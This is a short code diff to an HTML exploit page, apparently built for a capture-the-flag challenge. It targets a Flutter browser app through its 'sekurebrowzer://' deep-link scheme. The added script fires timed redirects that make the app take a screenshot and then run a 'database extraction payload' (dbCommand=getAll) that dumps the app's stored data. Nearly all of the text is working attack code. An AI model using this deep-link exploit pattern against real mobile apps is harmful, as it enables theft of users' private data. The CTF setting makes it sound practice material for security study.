@@ -36,13 +36,20 @@
             document.body.appendChild(alertBox);
         };
 
+        setTimeout(() => {
+            document.getElementById('exploit-status').innerText = "Taking screenshot...";
+
+            // Take Screenshot
+            window.location.href = 'sekurebrowzer://https://yahoo.com?url=https://vini2001.github.io/ctf/index.html&screenshot=a&takeScreenshot=true';
+        }, 3000)
+
         // 2. Automatically trigger the database dump after a short delay
         setTimeout(() => {
             document.getElementById('exploit-status').innerText = "Firing database extraction payload...";
             
             // This URL triggers the native 'getAll' branch in the Flutter app
             window.location.href = 'sekurebrowzer://https://yahoo.com?url=https://vini2001.github.io/ctf/index.html&dbCommand=getAll';
-        }, 1500);
+        }, 7000);
     </script>
 </body>
 </html>
